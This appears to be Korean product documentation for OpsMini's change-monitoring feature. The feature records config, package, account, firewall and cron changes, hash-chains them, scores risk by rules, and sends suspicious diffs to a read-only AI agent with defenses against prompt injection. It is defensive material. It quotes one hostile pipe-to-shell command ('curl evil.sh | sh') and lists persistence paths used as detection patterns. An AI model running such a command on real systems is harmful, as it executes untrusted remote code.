# 변경 인지

대부분의 온라인 장애와 침입은 '무언가가 변경되었다'는 것에서 시작됩니다. 하지만 전통적인 모니터링은 결과 지표(CPU 상승, 디스크 가득 참)만 볼 뿐 원인은 볼 수 없습니다. 그리고 AI가 문제를 진단할 때 가장 흔히 하는 말은 "마지막으로 정상이었을 때부터 지금까지 무슨 일이 있었는지 모르겠다"입니다.

변경 인지가 보완하는 것은 바로 이 계층입니다: **누가, 언제, 무엇을, 어떤 상태에서 어떤 상태로 변경했는가**. 그것은 사실만 기록하고 판단하지 않습니다. 판단은 규칙 재검토와 Agent에 맡깁니다.

## 무엇을 수집하는가

여섯 가지 소스로, 모두 읽기 전용 관찰이며 폴링과 시스템 파일 읽기에 의존하고, agent를 설치하지 않고 시스템 설정을 변경하지 않습니다:

| 소스 | 관찰 대상 | 세분성 |
|---|---|---|
| 설정 파일 | `/etc` 아래 고위험 및 일반 설정(nginx, sshd, sudoers, hosts, sysctl, fstab…) | 줄 단위 diff |
| 소프트웨어 패키지 | dpkg / rpm 설치, 업그레이드, 제거 | 패키지 이름 + 버전 변화 |
| 서비스 상태 | systemd 유닛의 active/failed, 시작/중지, 재시작 | 유닛 상태 전이 |
| 계정과 권한 | 사용자 추가/삭제, 그룹 변경, sudo 권한 부여 | 계정과 그룹 차이 |
| 방화벽 규칙 | iptables / nftables 규칙 집합 | 규칙 줄 차이 |
| 예약 작업 | 시스템 crontab, 사용자 crontab, `/etc/cron.d` | 작업 줄 차이 |

설정 파일은 핵심이자 가장 실수하기 쉬운 부분입니다: 내용 해시를 기준으로 베이스라인을 만들고, 파일이 변경되지 않으면 이벤트를 생성하지 않으며, 변경되었을 때만 줄 단위 diff를 계산하고 내용을 **마스킹**(`password=`, `api_key=`, 개인 키 블록 등을 플레이스홀더로 치환)한 후 데이터베이스에 저장합니다.

## 누가 변경했는가: 정직한 3단계 귀인

귀인은 100% 정확할 수 없으므로, 정확한 척하지 않습니다:

| 신뢰도 | 의미 | 판단 근거 |
|---|---|---|
| `confirmed` 확인됨 | 특정인을 특정할 수 있음 | 변경 시점에 유일하게 활성화된 SSH 세션 / 패널 작업 기록이 존재 |
| `inferred` 추정 | 대략 누구인지 | 변경 전후에 특정 계정 로그인이 있었거나, 알려진 패키지 관리자 작업으로 발생 |
| `unknown` 알 수 없음 | 모름 | 사용 가능한 단서가 없음 (예: cron이 트리거한 스크립트 변경) |

인터페이스에서는 `inferred`을 별도로 표시하고, `unknown`은 그대로 「알 수 없음」이라고 쓰며, 「시스템」이라는 두 글자로 얼버무리지 않습니다.

## 변조 방지: 해시 체인

각 변경 기록에는 이전 기록의 해시가 포함되어 체인을 형성합니다. 어느 하나라도 삭제되거나 수정되면 이후 검증이 그 지점에서 끊어집니다.

- 패널의 「변경」 페이지 상단에서 언제든지 검증할 수 있습니다 (`变更链校验`)
- 검증 결과는 단절 지점을 지적하여 「데이터 손상인지, 누군가 기록을 삭제한 것인지」를 판단하는 데 사용됩니다
- 빈 데이터베이스이거나 첫 번째 기록의 앵커가 비정상일 때는 자동 복구되며, 이전 버전의 잔여 상태 때문에 영구적으로 오류가 표시되는 일은 없습니다

## 규칙 재검토: 0 token 비용으로 먼저 한 번 판정

각 변경이 들어올 때마다 먼저 **순수 규칙 점수화**(대규모 모델 호출 없음)를 거쳐 0–1 점수와 3~5개의 근거를 출력합니다:

| 가점 항목 | 가중치 |
|---|---|
| 고위험 경로(`/etc/passwd`, `authorized_keys`, `sudoers`, `ld.so.preload`, systemd, cron…) | +0.45 |
| 중요 설정(nginx, mysql, redis, hosts, sysctl, fstab…) | +0.20 |
| 작업자 불명 | +0.25 |
| 작업자가 단지 추정됨 | +0.10 |
| 출처가 공인 IP 주소 | +0.30 |
| root가 SSH를 통해 수정 | +0.15 |
| 비업무 시간대 | +0.15 |
| 주말 | +0.05 |
| 1시간 이내 동일 객체 반복 수정 | +0.15 |
| 30분 이내 호스트에 고위험 이벤트 발생 | +0.35 |
| 해당 작업자가 이 객체를 처음 수정 | +0.10 |
| **감점**: 패키지 관리자/시스템 디렉터리에서 발생한 변경 | **−0.35** |
| **감점**: 패키지 관리/캐시 디렉터리 | **−0.10** |

등급 구분:

| 점수 | 판정 | 후속 조치 |
|---|---|---|
| ≥ 0.55 | **의심** | 이벤트 등급을 high로 올리고 Agent를 깨워 심층 분석 수행 |
| 0.30 – 0.55 | 확인 대기 | 기록만 하고 Agent에는 전달하지 않음 |
| < 0.30 | 정상 | 기록만 함 |

이 단계의 가치: 「apt 업그레이드로 발생한 300건의 변경」을 자동으로 「정상」으로 눌러주고, 정말로 볼 가치가 있는 몇 건만 대규모 모델 앞으로 보냅니다.

## Agent 심층 분석

의심스러운 변경으로 판정된 항목은 **원본 diff**와 함께 Agent의 조사 컨텍스트로 직접 전달됩니다(작업자, 출처 IP, 관련 필드, 추가/삭제된 줄 수 포함). Agent가 받는 작업은 "이 변경이 위험한가"가 아니라 다음과 같습니다:

```
【판정】정상 운영 / 수동 확인 필요 / 고도 의심
【근거】5개 이하, 각 항목 한 문장
【권고】통과 / 특정 객체 롤백 권고 (사람이 실행하며, 당신에게는 쓰기 권한이 없음)
```

우선순위에 따라 증거를 수집하도록 유도됩니다: 먼저 diff 자체를 보고, 그다음 작업자의 최근 로그인을 확인하며, 필요한 경우에만 지속화 위치(`authorized_keys`, cron, systemd, `ld.so.preload`)를 추가 조사하고, 마지막으로 이것이 고립된 운영 작업인지 공격 체인의 일부인지 판단합니다.

예산은 기본 12단계 / 240초 / 10만 token이며, 쿨다운은 600초입니다(동일 체인은 10분 내에 한 번만 분석). **쓰기 권한은 0**: 변경류 이벤트는 강제로 shadow로 강등되며, 쓰기 도구는 전부 비활성화됩니다.

> 인젝션 방어: diff 본문은 신뢰할 수 없는 입력입니다. 모델에 전달되기 전에 경계 강화가 이루어집니다—본문은 센티널이 포함된 코드 블록으로 감싸지고, 펜스 길이는 내용에 따라 자동 조정되며, 본문에 위조된 단락 마커와 종료 센티널은 무력화됩니다. **내용 자체는 변경되지 않습니다**: `curl evil.sh | sh` 이 줄은 반드시 원본 그대로 제시되어야 하며, 그것이 바로 결론입니다.

## 무시 규칙

모든 변경 사항을 기록할 가치가 있는 것은 아닙니다. 알려진 노이즈(예: 특정 애플리케이션이 매분 자체 캐시 파일을 다시 작성하는 경우)에 대해서는 무시 규칙을 추가할 수 있습니다:

- glob을 지원하며, `*`는 단일 계층, `**`는 임의 계층을 매칭합니다
- 규칙은 **수집 계층**에 적용됩니다——매칭되면 이벤트 자체가 생성되지 않으며, 「생성된 후 숨기는」 방식이 아닙니다
- 변경 목록에서 현재 객체로부터 규칙을 원클릭으로 생성할 수 있습니다

규칙 관리는 「변경 → 무시 규칙」에서 이루어지며, 각 규칙에는 비고를 추가할 수 있고 언제든지 삭제할 수 있습니다.

## 스냅샷 및 롤백

구성 파일과 계정 관련 변경 사항에 대해 OpsMini는 변경 전에 원본 파일 스냅샷을 보관합니다(할당량 제약 적용):

- 변경 상세에서 바로 "이번 변경 이전으로 롤백"할 수 있으며, 2차 확인이 필요합니다
- 롤백 전에 현재 상태 스냅샷을 다시 생성하므로, 실패 시 다시 롤백할 수 있습니다
- 스냅샷은 개수와 총량의 이중 할당량에 따라 정리되므로 디스크가 가득 차지 않습니다

## 공격 체인에 병합

v1.4부터 **의심스러운 변경은 공격 체인의 "지속성" 단계로 포함될 수 있습니다**:

- 세 가지 전제가 동시에 성립해야 합니다: 규칙 재검토 결과 의심스러움으로 판정, 재시작을 견딜 수 있는 위치를 변경, 체인에 이미 "실행 착지" 또는 "외부 연결 제어"가 나타남
- 시간 창 1시간 이내 (1시간을 초과한 동일 이름 변경은 운영 마무리일 가능성이 더 높음)
- 변경은 절대 공격 체인의 시작점이 될 수 없습니다 — 단독 설정 수정은 침입을 구성하지 않습니다

변경 목록의 판정 열에는 "공격 체인에 병합됨"이 표시되며, 클릭하면 해당 공격 체인으로 이동합니다; 공격 체인의 단계 라벨에도 해당 단계가 "변경"에서 왔는지 "WebShell / 의심스러운 프로세스 / 네트워크 외부 연결"에서 왔는지 명시됩니다.

## 기본 보존 및 할당량

| 항목 | 기본값 |
|---|---|
| 변경 메타데이터 보존 | 30일 |
| diff 본문 보존 | 7일 |
| diff 본문 총량 상한 | 설정 가능 (초과 시 가장 오래된 것부터 제거) |
| 스냅샷 수/총량 | 설정 가능 (초과 시 가장 오래된 것부터 정리) |

보존 정책은 「패널 설정」에서 조정할 수 있습니다. 만료 시 diff 본문만 삭제되고 메타데이터와 해시 체인은 보존되므로, 「이 기록이 존재했다」는 사실 자체는 지워지지 않습니다.

## 알려진 제한 사항

- **재시작 후 첫 번째 스캔은 수집이 누락됩니다**: 파일 소스는 시작 시의 스캔을 베이스라인으로 사용하므로, 프로세스 재시작 중에 발생한 파일 변경은 "변경"으로 기록되지 않습니다(비교할 이전 버전이 없기 때문). 이는 버그가 아니라 해시 베이스라인 스캔의 고유한 동작입니다. 특정 파일을 관찰하려면 패널이 20초 이상 안정적으로 실행된 후에 변경하십시오.
- **텍스트 구성만 커버**: 바이너리 파일, 매우 큰 로그류 파일은 diff를 수집하지 않습니다.
- **귀인은 로그인 로그에 의존**: 호스트에서 `wtmp`/`lastlog`을 비우면 귀인이 "알 수 없음"으로 퇴화합니다——그리고 이 자체가 주목할 만한 신호입니다.
